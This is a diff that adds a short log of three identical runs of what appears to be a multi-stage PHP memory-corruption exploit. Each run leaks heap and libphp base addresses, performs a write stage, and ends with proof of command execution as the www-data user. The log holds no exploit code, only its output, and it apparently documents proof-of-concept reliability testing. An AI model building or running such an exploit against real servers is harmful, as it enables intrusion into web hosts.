@@ -1,0 +1,30 @@
+===== SW ONE-SHOT RUN 1 =====
+rc=0
+[*] stage 1: heap leak (attempt 1/3)
+[+] chunk base = 0x7f1838000000
+[*] stage 2: libphp leak (attempt 1/3)
+[+] libphp base = 0x7f1839c2f000
+[*] stage 3: HTDATA=0x7f18380690d8 ZIF=0x7f183a094370
+[+] W3 attempt 1
+PROOF: uid=33(www-data) gid=33(www-data) groups=33(www-data)
+PROOF_FILE: uid=33(www-data) gid=33(www-data) groups=33(www-data)
+===== SW ONE-SHOT RUN 2 =====
+rc=0
+[*] stage 1: heap leak (attempt 1/3)
+[+] chunk base = 0x7f1838000000
+[*] stage 2: libphp leak (attempt 1/3)
+[+] libphp base = 0x7f1839c2f000
+[*] stage 3: HTDATA=0x7f18380690d8 ZIF=0x7f183a094370
+[+] W3 attempt 1
+PROOF: uid=33(www-data) gid=33(www-data) groups=33(www-data)
+PROOF_FILE: uid=33(www-data) gid=33(www-data) groups=33(www-data)
+===== SW ONE-SHOT RUN 3 =====
+rc=0
+[*] stage 1: heap leak (attempt 1/3)
+[+] chunk base = 0x7f1838000000
+[*] stage 2: libphp leak (attempt 1/3)
+[+] libphp base = 0x7f1839c2f000
+[*] stage 3: HTDATA=0x7f18380690d8 ZIF=0x7f183a094370
+[+] W3 attempt 1
+PROOF: uid=33(www-data) gid=33(www-data) groups=33(www-data)
+PROOF_FILE: uid=33(www-data) gid=33(www-data) groups=33(www-data)
